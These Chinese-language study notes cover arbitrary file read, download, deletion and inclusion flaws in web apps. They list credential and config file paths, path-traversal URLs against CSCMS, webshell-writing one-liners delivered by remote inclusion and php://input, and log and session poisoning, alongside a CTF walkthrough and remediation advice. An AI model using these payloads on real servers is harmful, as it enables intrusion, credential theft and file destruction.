应用配置文件 获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。 java站点 /WEB-INF/web.xml /WEB-INF/classes/applicationContext.xml /WEB-INF/classes/xxx/xxx/xxx.class core.jar如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索Base64.decode直接找key，进而getshell。 tomcat /usr/local/tomcat/conf/tomcat-users.xml nginx /www/nginx/conf/nginx.conf /etc/nginx/nginx.conf /usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.conf apache /etc/httpd/conf/httpd.conf /etc/apache2/apache2.conf /etc/apache2/httpd.conf redis /etc/redis.conf ssh /etc/ssh/sshd_config 9. 应用日志文件 利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。 tomcat 可以先找到/tomcat/bin/catalina.sh，里边有log的配置路径 /webapps/ROOT/logs/catalina.out apache /var/log/apache2/access.log /var/log/apache2/error.log /var/log/httpd/access_log /etc/httpd/logs/access_log /etc/httpd/logs/error_log /etc/httpd/logs/error.log nginx /var/log/nginx/access.log /var/log/nginx/error.log /usr/local/var/log/nginx/access.log /usr/local/nginx/logs 10. Windows下的利用姿势 10.1 盲读取桌面文件 有些时候，管理员会图方便，在桌面存储一些敏感的文件，我们可以直接对桌面的一些文件名进行fuzz，比如1.txt、2.txt、密码.txt、pass.txt等等，进一步扩大战果。 5. 任意文件下载漏洞 一些网站由于业务需求，往往需要提供文件下载功能，但若对用户下载的文件不做限制，则恶意用户就能够下载任意敏感文件，这就是文件下载漏洞。 漏洞产生原因 有读取文件的函数 读物文件的路径用户可控，且没有经过校验，或者校验不严格 输出文件内容 一个正常的网站，存在一个下载文件的功能，同时还会从浏览器接收文件名字 文件下载的两种方式 1、直接下载： &lt;a href=”http://www.a.com/xxx.rar”&gt;下载&lt;/a&gt; 2、增加header头 &lt;?php $filename = $_GET['filename']; echo '&lt;h1&gt;开始下载文件&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;'; echo file_get_contents($filename); header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$filename); header('Content-Lengh: '.filesize($filename)); ?&gt; 利用思路 下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置 下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。 下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。 尝试读取/root/.bash_history看自己是否具有root权限。 如果没有，就只能利用../来回跳转读取一些.ssh下的配置信息文件。 读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载需要审计的代码文件，但是下载的时候变得很繁琐，只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。 常见利用方式 java+oracle环境 可以先下载/WEB-INF/classes/applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/aaa.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器。 也可以先下载网站的配置文件，在根目录/WEB-INF/Web.xml的(一般都有很多内容,有时含有数据库连接用户名和密码等关键信息)。 具有root权限 在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。 当不知道路径是什么的情况下，这个可以说是一个非常好用的了，我们利用任意文件下载漏洞将mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。 locate 读取方法 locate mlocate.db admin 可以将mlocate.db中包含admin内容全部输出来。 利用这个文件可以获取到该服务器任何我们想要的内容并下载出来而不用一个一个去猜解目录，但是这个文件只有root用户才能读取。另一方面我们也可以利用linux内核的一个文件/proc/self/cmdline当前进程的cmdline参数，可以获取到路径信息。 总的来说，任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。 6. 任意文件读取与下载漏洞验证 任意文件读取验证 示例代码： &lt;?php $filename=$_GET['f']; echo file_get_contents($filename); ?&gt; 测试： readfile.php?f=../../../../../../etc/passwd readfile.php?f=../index.txt file://伪协议 ，读取文件内容 readfile.php?f=file:///etc/passwd 任意文件下载验证 示例代码： &lt;?php $filename = $_GET['f']; echo '&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;'; echo file_get_contents($filename); header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$filename); header('Content-Lengh: '.filesize($filename)); ?&gt; 当然，我下载的这个文件并没有内容。 7. 漏洞判断 参数f的参数值为PHP文件时： 1.文件被解析，则是文件包含漏洞 2.显示源代码，则是文件读取漏洞 3.提示下载，则是文件下载漏洞 8. 漏洞利用实战 我学习任意文件读取与下载漏洞，就是因为遇到了一个任意文件读取与下载漏洞的Web题，所以在此实战一下 RoarCTF2019-Web：Easy Java(跟着复现吧) 不是弱口令，也不能扫出目录。只有一个help.docx文件可以下载。于是可能是任意文件下载漏洞。 点击蓝字“help”，抓包，发包。发现GET方式一直什么都下载不了。后来修改为POST，就可以下载了。 此时url：download，猜测是文件下载漏洞, 如下图发现filename参数可控 没啥用, 补充一下java web的目录结构 敏感目录 （1） /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 （2） /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 （3） /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 （4） /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 （5）/WEB-INF/database.properties：数据库配置文件 WEB-INF/web.xml泄露 漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。 POST访问WEB-INF/web.xml, 发现 没错, 搞心态的 参照之前，想尝试访问/WEB-INF/web.xml得到文件但是失败了，查看源码发现有个地方是要求POST方式传入 发现如下 发现操作flag的关键文件位置，读取(或下载)/WEB-INF/classes/下的flag的关键文件位置，又因为Java字节码类文件（.class）是Java编译器编译Java源文件（.java）产生的“目标文件”。 最终得出flag的关键文件位置为：/WEB-INF/classes/com/wm/ctf/FlagController.class base64解码即可 9. 漏洞防御修复 通用 过滤 . 点，使用户在url中不能回溯上级目录 正则严格判断用户输入的参数 php.ini配置open_basedir限定文件访问范围 文件下载漏洞修复 将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：www.test.com/download?filename=文件名 净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。 web应用程序可以使用chroot环境包含被访问的web目录，或者使用绝对路径+参数来访问文件目录时, 使其即使越权也在访问目录之内。www目录就是一个chroot应用。由chroot创造出的那个根目录，叫做“chroot监狱”(所谓”监狱”就是指通过chroot机制来更改某个进程所能看到的根目录，即将某进程限制在指定目录中，保证该进程只能对该目录及其子目录的文件有所动作，从而保证整个服务器的安全。 详细具体chroot的用法，可参考：blog.csdn.net/frozen_fish/article/details/2244870 任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，需更新其中间件的版本可修复。 要下载的文件地址保存至数据库中。 文件路径保存至数据库，让用户提交文件对应ID下载文件。 用户下载文件之前需要进行权限判断。 文件放在web无法直接访问的目录下。 不允许提供目录遍历服务。 公开文件可放置在web应用程序下载目录中通过链接进行下载。 记录文件下载日志。 0x03 文件删除 1.1 漏洞描述 ​ 应用程序在删除文件前，未对所要删除的文件内容、类型、文件名、文件目录做合法性校验，导致可删除服务器上任意文件，比如删除安装目录中锁文件，直接进行重装应用系统。 ​ 攻击者从寻找上删除的功能，正常删除功能的文件没有经过校验或者不严格，攻击者控制这个可操作的变量配合目录遍历进行删除其他文件。这里涉及到一个unlink()函数，这个函数的作用是删除对应的文件及文件内容。 1.2 应用场景 删除文件、附件、图片、替换、配置等 1.3 漏洞危害 攻击者利用此漏洞可直接删除web目录甚至服务器上任意格式文件，直接导致业务系统中断、崩溃。 1.4 漏洞实例(不知为何, 这种漏洞的文章太少了, 先跟着复现吧) 1.4.1 环境搭建(看了半天才发现, 现在的漏洞已经被修复了…) 因此我借鉴之前有漏洞的情况, 把关键代码写上去吧 CSCMS ：http://www.chshcms.com 网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05） 程序源码下载：https://github.com/chshcms/cscms 漏洞实例一 漏洞文件位置：\\cscms\\plugins\\sys\\admin\\Basedb.php 第160-177行： //备份删除 public function del(){ $dir = str_replace(\"//\",\"/\",str_replace(\"..\",\"\",$this-&gt;input-&gt;get_post('id',true))); //修复前 //$dir = $this-&gt;input-&gt;get_post('id', true); if(empty($dir)){ getjson(L('plub_11')); } $dirs = array(); if(!is_array($dir)){ $dirs[] = $dir; }else{ $dirs = $dir; } foreach($dirs as $dir) { deldir(FCPATH.'attachment/backup/'.$dir); } $info['msg'] = L('plub_12'); $info['url'] = site_url('basedb/restore').'?v='.rand(1000,9999); getjson($info,0); } 漏洞利用： 1、根目录下新建test目录作为测试： 2、构造参数成功删除test目录(环境看不懂咋搭建, 就算了吧) http://127.0.0.1/admin.php/basedb/del POST:id=..\\\\..\\\\test 漏洞实例二 漏洞文件位置：/plugins/sys/admin/Skin.php 第418–440行： //文件删除 public function del(){ $ac = $this-&gt;input-&gt;get('ac',true); $op = $this-&gt;input-&gt;get('op',true); $dir = str_replace(\".\",\"\",$this-&gt;input-&gt;get('dirs',true)); $file = str_replace(\"..\",\"\",$this-&gt;input-&gt;get('file')); //修复前 //$dir = $this-&gt;input-&gt;get('dirs',true); //$file = $this-&gt;input-&gt;get('file'); if($ac!='mobile') $ac='pc'; if($op!='home' &amp;&amp; $op!='user') $op='skins'; if(empty($dir) || preg_match(\"/^[\\/]{1,}$/i\",$dir)) getjson(L('plub_27')); $skin_dir = VIEWPATH.$ac.FGF.$op.FGF.$dir.FGF.$file; if (!is_dir($skin_dir)) { //文件 $res=unlink($skin_dir); }else{ //目录 $res=deldir($skin_dir); } if($res){ $info['url'] = site_url('skin').'?ac='.$ac.'&amp;op='.$op.'&amp;v='.rand(1000,9999); $info['msg'] = L('plub_46'); $info['turn'] = 1; getjson($info,0); }else{ getjson(L('plub_28')); } } 漏洞利用： 网站根目录下新建1.txt文件作为测试，构造URL成功删除文件 Payload：http://127.0.0.1/admin.php/skin/del?ac=pc&amp;op=skins&amp;dirs=default&amp;file=..\\\\..\\\\..\\\\..\\\\1.txt 漏洞实例三 漏洞文件位置：/plugins/sys/admin/Plugins.php 第285-299行： //删除 public function del(){ $dir = $this-&gt;input-&gt;get_post('dir',true); if($dir==''){ getjson(L('plub_del_0'),1); } deldir(FCPATH.'plugins'.FGF.$dir.FGF); //删除配置目录 deldir(CSCMS.$dir.FGF); //删除模板目录 deldir(FCPATH.'tpl/admin/'.$dir.FGF); $info['func'] = __FUNCTION__; $info['msg'] = L('plub_del_1'); getjson($info,0); } 漏洞利用: ?dir=…\\test; 自己搭建一个 &lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $filename = $_GET['file']; if(file_exists($filename)){ unlink($filename); echo \"&lt;script&gt;alert('删除成功')&lt;/script&gt;\"; }else{ echo \"&lt;script&gt;alert('删除失败')&lt;/script&gt;\"; } 执行查询后，文件被删除成功了, 目录中没了, 当然也可以遍历目录删除 1.5 修复建议 限制文件删除函数可删除的目录位置、文件类型 文件名非用户可控 0x04 文件包含 为何要进行文件包含？ ​ 程序员写程序的时候，不喜欢干同样的事情，也不喜欢把同样的代码（比如一些公用的函数）写几次，于是就把需要公用的代码写在一个单独的文件里面，比如 share.php，而后在其它文件需要使用时进行包含调用。在php里，我们就是使用上面列举的那几个函数来达到这个目的的，它的工作流程：如果你想在 main.php里包含share.php,我将这样写 include(“share.php”) ，然后就可以使用share.php中的函数了 文件包含漏洞汇总: 文件包含 常见的文件包含函数: PHP：include() 、include_once()、require()、require_once() JSP/Servlet：ava.io.file()、java.io.filereader() ASP：include file、include virtual 文件包含各个脚本代码 ASP,PHP,JSP,ASPX等 &lt;! --#include file=“1.asp” --&gt; &lt;c:import url=“http://thief.one/1.jsp”&gt; &lt;jsp:include page=“head.jsp”/&gt; &lt;%@ include file=“head.jsp”%&gt; &lt;?php Include('test.php')?&gt; ​ 黑盒测试（Black-box testing）是一种软件测试方法，其中测试人员在测试过程中只关注输入和输出，而对被测试系统的内部结构和实现细节不了解。测试人员将软件系统视为一个\"黑盒子\"，只能观察和测试其功能和行为，而不了解其内部工作原理。 ​ 简单来说, 应该跟白名单一样, 当你输入的参数是正确的或者是系统认可的, 那你就可以成功输入 1.1文件包含漏洞的原理 ​ 文件包含漏洞是一种常见的web类型漏洞,因为很多脚本语言支持使用文件包含,也就是我们所说的文件包含函数，网站开发者经常会把一些代码插入到指定的地方,从而节省时间避免再次编写 ,这就是包含函数的基础解释 ,但是我们不光可以包含我们预先指定的文件，也可以包含我们服务器内部的其他文件，前提条件就是我们需要有可读的权限才能读取这些文件 ,所以这样就会导致文件包含漏洞 1.2文件包含漏洞产生的原因 ​ 在网站的开发人员在开发网站的时候，会把经常重复使用的函数或者特定的页面写到单个文件中，需要使用的时候就直接调用此文件即可，而无需再次浪费时间再次编写，这种操作通常被称为文件包含。 ​ 如果我们没有对文件的来源进行严格的审查，也就是程序员在编写代码的时候触犯的逻辑性的错误就可能会导致文件读取漏洞和其它类型的漏洞，我们已php为例，在php中常用的文件包含函数有（include、require、include_once、require_once）,后续会介绍其中的区别。 1.2.1 无限制&amp;有限制的包含 无限制为直接直接包含文件： &lt;?php $filename=$_GET['filename']; include($filename); ?&gt; 有限制为直接直接包含文件：以添加固定后缀为例 &lt;?php $filename=$_GET['filename']; include($filename.\".html\"); ?&gt; 1.3漏洞的形成需要的条件 1、`include()`等函数通过`动态变量的方式`引入需要包含的文件； 2、`用户能够控制`这个动态变量； 注：一般来说服务端通过`GET`和`POST`两种请求方式来传递需要包含的文件的话就是用户可控的。 1.3文件包含漏洞实例 ​ Apace solr是apache公司研发的一款开源的搜索服务,应用范围很广,而且应用的人群也是很广的，但是在近几年它被爆出存在任意文件读取的漏洞，攻击者可以通过构造指定的payload对服务器内部文件进行读取的操作，这就造成很大的危害，因为我们可以通过读取敏感的数据从而控制服务器。 1.4文件包含漏洞分类 ​ 其文件包含漏洞共分为两大类，本地文件包含和远程文件包含，但是如果想要实现远程文件包含，需要php.ini开启了allow_url_fopen和allow_url_include的配置。包含的文件是第三方服务器的文件。本地文件包含的含义就是包含本地服务器的文件 1.4.1 本地包含 原理： 本地文件包含（Local File Include，LFI），能够读取或执行包含本地文件的漏洞，称为本地文件包含漏洞。 LFI允许攻击者通过浏览器包含本机上的文件。当一个WEB应用程序在没有正确过滤输入数据的情况下，就有可能存在这个漏洞，该漏洞允许攻击者操纵输入数据、注入路径遍历字符、包含web服务器的其他文件。 无限制：可直接包含http://127.0.0.1:8888/webinclude.php?filename=phpinfo.txt 有限制：即漏洞使用有干扰，则需要特殊方法绕过 %00 截断：条件：magic_quotes_gpc = off php版本&lt;5.3.4 长度截断：条件：区分操作系统：windows点号需要长于256；linux长于4096 1.4.2 远程包含 无限制：直接包含：http://192.168.114.11/webinclude.php?filename=http://www.xiaodi8.com/readme.txt 限制强制添加.html 可以用以上的符号 ? 、%23（#注释符） 、%20（空格）（不可用） 注意： 为什么文件包含一般使用txt格式的文件？ 1、文件包含是无视文件格式的，只要文件中含有php代码，它就会把这个文件解析为1php脚本文件； 2、当靶机对我们远端服务器的php脚本远程文件包含时，由于我们远端服务器可以解析php脚本，这样的话，我们远端服务器首先会对这个php脚本进行解析执行，远端服务器解析完成后，直接把解析后的结果返回给靶机服务器，由于是在我们远端服务器里面进行解析执行的，所以返回的结果就是我们远端服务器的执行结果。 当我们使用txt格式或者其他非php格式进行文件包含时，由于我们远端服务器没有对文件进行包含，不会在我们远端服务器进行解析；当靶机对我们远端服务器的这个txt文件进行远程文件包含时，靶机对 txt文件进行读取时，这就相当于靶机服务器通过远程文件包含把我们远端服务器的txt文件拿到靶机上面了，靶机发现里面有php代码，这个时候，靶机就会按照php脚本对它进行解析；由于是在靶机里面读取的，所以执行的结果就是靶机的。 远程文件包含需要包含我们服务器上的文件或者公网上的文件。 1.4.3 本地文件包含代码测试-原理 本地准备 phpinfo的txt文件 http://127.0.0.1:8888/webinclude.php?filename=phpinfo.txt 大多代码语言文件包含中可添加路径以读取其他路径下文件：`../../`，`d:\\`等 有限制时：以添加 .html后缀为例 1.4.4 远程文件包含代码测试-原理 对于远程包含，若php环境禁止，即没有远程包含功能 无限制时直接包含：(可以使用?和#进行伪截断，该方法对PHP版本没要求，但是要求能够包含远程文件。) 以添加 .html后缀为例的限制级： 1.4.5 远程文件包含代码测试-原理 1、查看远端服务器的ip和phpinfo();信息: ip：185.243.241.45 phpinfo()信息:php版本为5.6.40 2、查看靶机的ip和phpinfo();信息: ip：127.0.0.1 phpinfo()信息:php版本为7.3.4 3、在远端服务器网站主目录下，创建两个文件，一个是1.php，一个是1.txt: 内容: &lt;?php phpinfo();?&gt; 4、在靶机上面对远端服务器的1.php文件进行文件包含，可以看出，解析的结果为远端服务器的phpinfo();信息，如果使用一句话木马的话，获得的webshell也是自己的远端服务器的： 注:这里之所以返回的是我们的远端服务器的phpinfo();信息，是因为phpinfo();脚本在我们的远端服务器上面被执行了，执行完成后，通过文件包含返回了远端服务器的执行结果。也就是说这个执行结果不是靶机网站的而是我们自己的远端服务器的执行结果。 5、在靶机上面远程包含我们远端服务器网站主目录下的1.txt文件，可以看出，可以看出解析的结果为靶机的phpinfo();信息： 注:当我们使用txt格式或者其他非php格式进行文件包含时，由于我们远端服务器没有对文件进行包含，不会在我们远端服务器进行解析；所以当靶机对我们远端服务器的这个1.txt文件进行远程文件包含时，远端服务器不对它做解析，靶机对1.txt进行读取时，发现里面有php代码，这个时候，靶机就会按照php脚本对它进行解析；由于是在靶机里面读取的，所以执行的结果就是靶机的。 1.4.6 包含大马文件： 1、复制一个大马文件dama.php到主机的网站主目录下，并修改后缀名为txt格式： 2、直接访问这个文件，发现服务器是以文本文件的方式打开： 3、对这个文件进行远程文件包含，发现dama.txt格式的文件被以php脚本的形式解析了： 这里不知道为啥我显示的页面不对劲，下面展示一个正常的 1.4.6 写入文件脚本方式，写入一句话木马 1、在虚拟机网站主目录下面创建一个3.txt的文件,通过这个文件向服务器里面写入一句话木马yih.php文件： 内容： &lt;?php $file=fopen('yjh.php','w'); fputs($file,'&lt;?php @eval($_REQUEST[666]);?&gt;'); ?&gt; 3、使用远程文件进行包含这个文件，并查看文件包含目录下，已经创建了一个yjh.php的文件： 4、使用蚁剑进行连接，成功获得webshell（这里注意添加yjh.php的路径法） 注意: 有时候，我们无法通过传入参数进行访问phpinfo页面，可能是DVWA的环境问题；还有就算我们能够连接到这个文件，但是菜刀连接不上，这个时候我们可以创建一个写入文件的脚本文件，通过访问这个脚本文件，在目标服务器里面创建一个一句话木马的方式进行连接。 1.5漏洞的攻击步骤 我们将从php语言的角度来看一下文件包含漏洞，以及相关的攻击步骤 在php语言当中，有四种文件包含的函数，分别是include、require、include_once、require_once Include：被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path指定的目录寻找。如果在 include_path下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条警告； ps：php开启错误题型需要配置php.ini中disaply_errors为On Require：require 和 include几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 E_COMPILE_ERROR 级别的错误。换句话说将导致脚本中止而 include只产生警告（E_WARNING），脚本会继续运行。 Include_once：include_once 语句在脚本执行期间包含并运行指定文件。此行为和 include语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含，且 include_once 会返回 true。 如同此语句名字暗示的那样，该文件只会包含一次。 include_once 可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。 Require_once：require_once 语句和 require语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 我们来总结下，include函数在执行文件时候每次都要进行读取和评估，在找不到文件的情况下会发出一条警告，且还会继续运行，require则会给出一条致命错误，从而停止运行，include_once和require_once和include和require类似，但他们仅仅只包含一次。 1.5.1 判断服务器类型 ​ 其实判断服务器类型还是很好判断的, 在linux系统当存在1.php的时候读取就是cat 1.php，而且读取的内容假如是：“I Love You”，若是读取1.Php那么还能够显示\"I Love You\"吗？结果肯定是不行的，由于在linux中是严格区分大小写的。而在windows中是不区分大小写的，这里就可以使用windows进行测试。 通过上面的图片能够看出来，我在URL中读取的是1.phP，但文件夹中只有1.php，但依旧显示PHP的默认文件。这就验证了我上面提到的Windows是不区分大小写的。 1.5.2 敏感文件读取 所谓读取敏感文件，就是将WEB服务器上一些其他文件读取出来，这些其他文件中可能包含一些敏感文件，私密文件或者是一些数据、表格等。 1.5.3 绝对路径读取 绝对路径是指目录下的绝对位置，直接到达目标位置，通常是从盘符开始的路径，绝对路径读取就是通过明确的路径进行读取文件，比如windows或者linxu中的一些日志文件存在的路径，或者一些配置文件存放的路径。 windows敏感文件的绝对路径 C:\\boot.ini #查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml #IIS配置文件 C:\\windows\\repair\\sam #存储Windows的密码 C:\\programFiles\\mysql\\my.ini #mysql配置文件，里面可能有密码 C:\\programFiles\\mysql\\data\\mysql\\user.MYD #mysql root密码 C:\\windows\\php.ini #php配置文件 linux敏感文件的绝对路径 /etc/passwd #用户密码 /usr/local/app/apache2/conf/httpd.conf #apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置 /usr/local/app/php5/lib/php.ini #php相关设置 /etc/httpd/conf/httpd.conf #apache配置文件 /etc/my.cnf #mysql配置文件 /etc/sysconfig/iptables #查看防火墙策略 绝对路径读取案例 通过URL看到我这里是直接读取我C:\\tool\\PHPTutorial\\1.txt的文件。 1.5.4 相对路径读取 相对路径就是指由这个文件所在的路径引起的跟其它文件（或文件夹）的路径关系。相对路径读取就是当我们不知道某个文件具体路径的时候，使用相对路径以当前位置作为参看向后退，逐次访问。 相对路径读取方式 相对利用读取方式就需要使用\"…/“来进行读取，一次”../“向后退一次。 例如：当我们在C:\\tool\\PHPTutorial\\www的时候，那么我们使用”…/“的时候我们就退到C:\\tool\\PHPTutorial，若使用两次”…/“的时候就会退到C:\\tool，两次”../“也就是”../../\"就可以了。 eg__1: 这里我把1.txt创建在C:\\tool\\PHPTutorial目录下，而现在这个文件包含漏洞放在www下也就是C:\\tool\\PHPTutorial\\www，所以这里我只需要输入一次\"…/\"就可以读取到1.txt了。 eg__2: 这里我们思考一下若我们要访问C:\\windows\\win.ini，该怎么读取呢？其实这里可以先退到根目录下也就是C盘下，然后在访问windows中的win.ini。 目前我们在C:\\tool\\PHPTutorial\\www下面，那么可以算一下我们要退几次？这里通过目录也能够看出来，这里只需要退三次就可以到C盘下了。 这里由于无法在C盘中创建文件，就无法演示了，那么这里我们直接读取C:\\windows\\win.ini吧。 eg__3: 这里又出现一个问题，若我们并不知道我们存在那个目录下，更不知道该退几级怎么办？其实这里通过\"…/“退可以多退几次，因为最终只能够退到C盘，所以在不知道几级的情况下，可以多输入几个”…/“。 可以看我下面的图片，我原本只需要退三次就可以了，而我这里退八次依旧能读取到，所以就能证明刚刚我所解释的，不管输入多少个”…/\"最终只会退到C盘。 1.5.5 远程文件读取 远程文件包含大概意思在之前已经提过了，这里就演示一下案例。 前提条件：目标服务器的allow_url_fopen选项是on。只有当这个选项是on的时候就能够使用远程文件包含一句话木马。 这里用别人的演示 远程文件配合一句话木马案例 网站服务器：192.168.10.150 攻击者主机：192.168.10.50 攻击者php代码： &lt;?php fputs(fopen(\"shell.php\", \"w\"),\"&lt;?php @eval($_POST['pass']);?&gt;\")?&gt; 这句话的意思就是当访问这个php代码后就会在当前目录生成一个shell.php文件，并且这个文件中含有一句话木马。 通过查看服务器网站根目录，可以看到这里已经创建了一个名为shell.php的文件。那么我们通过这个文件使用蚁剑进行连接。 通过上面的图片可以看到，我们已经成功连接了。这里需要注意的是，我们这个地址是知道的，若在实际环境中操作的时候可能需要注意查找路径。 基于上面的文件包含的知识背景，我们可以有一个攻击的大概步骤： 我们先从include函数入手，来看一下include函数有什么特殊的地方，为此我们编写一个小脚本来验证下。 &lt;?php show_source(__FILE__); $file = $_GET['file']; include $file; ?&gt; ​ 在验证文件包漏洞的时候我们通常使用/etc/passwd文件是否能够被成功读取，该文件是我们linux的用户组信息，且这个文件的权限所有用户都可读。且里面包含的信息是我们当前服务器的所有用户的信息，属于敏感信息。 现在我们用这个小脚本验证一下是否能够成功的读取/etc/passwd文件。 我们发现成功的读取了/etc/passwd下面的文件。下面我们换一下我们要读取的文件，换个不存在的文件试一试，看看有什么效果 ​ 我们可以看到我们的服务器报了个warning的错误,因为此文件不存在，这正好是include函数的特点，文件不在的时候会丢出warning的错误，然后还会接着运行下去。接下来我们将include函数切换到require函数，看看有什么区别。 ​ 我们可以看到，我们的include在找不到文件的情况下会丢出warning的错误，而我们的requore函数直接丢出failed错误，直接就停止运行了，这就是我们之前介绍我们include和require函数的区别的地方。 ​ 下面我们从session文件包含来进行getshell的演示，我们先从phpinfo的信息获取到我们session的存储位置（这个位置其实我们可以猜测到的，因为就那几个固定的存储位置，例如：/var/lib/php5/sessions、/var/lib/php7/sessions、/var/lib/php/sessions等） ps: 接下来先跟着吧,我的环境是windows的… 为了验证session文件包含漏洞我们编写了一个简单的脚本，如下所示： &lt;?php show_source(__FILE__); session_start(); $_SESSION['PHPSESSID'] = $_GET['name']; include $_GET['file']; ​ 我们先打开浏览器访问此文件，然后我们在按F12键，查看我们的cookie，我们可以看到我们cookie中有个PHPSESSID的名称，其中它的值就是我们sessionid的值，也就是我们需要包含的文件。 我们在通过这个脚本，向seesion写入恶意的数据 ​ 这个时候我们打开我们的服务器，进去我们存储session的目录,然后找到对应的session文件，我们可以看到我们的内容已经成功写入到我们的session里面了。 然后我们访问我们session文件发现我们写入的脚本已经成功被执行了 接下来我们继续验证日志文件包含，但是我们需要满足条件才能进行文件包含，因为我们在读取文件的时候我们需要权限才能读取，我们看一下我们原本服务器日志文件的权限(这里看别人的) 可以看到我们可读权限仅适用于当前用户和用户组，其它用户并没有可读的权限。为了验证我们的实验，我们将其它用户设置成可读的权限。这样我们就可以读取我们的日志文件了。 ​ 现在我们就可以构造我们恶意的日志信息了，这里有一点需要注意下，我们在构造我们的日志信息的时候，不能直接在浏览器中构造（在url后面构造信息），因为如果直接在浏览器中构造，存储到日志信息的时候就会进行urlencode编码了，导致我们不能正常构造我们需要的日志信息，此时我们就需要BurpSuite工具了，通过抓包修改数据，这样存储的日志就不会进行urlencode编码了。 这里用现成的图片, 我忘了截屏了 可以看到已经写到了日志文件 这里不知道为何包含不了 1.6文件包含之伪协议利用 file:// #访问本地文件系统 http:// #访问HTTPs网址 ftp:// #访问ftp URL php:// #访问输入输出流 zlib:// #压缩流 data:// #数据 ssh2:// #security shell2 expect:// #处理交互式的流 glob:// #查找匹配的文件路径 php语言内置了很多封装协议，而这些协议则是我们处理文件包含漏洞经常用到的方法，最常见的协议有以下几种： php://input php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=“multipart/form-data” 的时候 php://input 是无效的。 此协议需要allow_url_include为on，在之前也强调过了。Input伪协议可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，所以它才能执行我们构造的数据。 php://input主要是用来执行php代码的，不过php://input需要以POST提交，这里我们先在URL中添加php://input然后抓包把GET修改为POST(但如下两图可以看出似乎不必把get修改为post)，最后在数据包的最后输入想要执行的代码就可以实现代码执行。 用法： #URL中: ?page=php://input #请求数据中： &lt;?php system(whoami);?&gt; #这里是通过php代码执行系统命令whoami; 1、在文件包含页面，通过burpsuite抓包： 2、用burpsuite抓包在url中输入php://input，在底部请求数据中可以写任意PHP代码： 获得phpinfo信息： 3、通过php代码执行系统命令： 4、写入一句话木马文件： &lt;?php fputs(fopen('test.php','w'),'&lt;?php @eval($_POST[test]);?&gt;'); ?&gt; 5、页面出现乱码解决： 在setting设置中可以找到 php://filter php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file()和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 php://filter 可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启，读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了 利用条件： 只是读取，所以只需要开启allow_url_fopen，对allow_url_include不做要求。 用法：php://filter/read=convert.base64-encode/resource=要读取的文件 URL：http://192.168.10.150/1.php/?name=php://filter/read=convert.base64-encode/resource=2.php 解密：&lt;?php phpinfo();?&gt; 我们来看下我们用filter伪协议读取的文件，因为我们使用了转换过滤器，导致输出的结果是base64编码的格式 base64解码得到flag 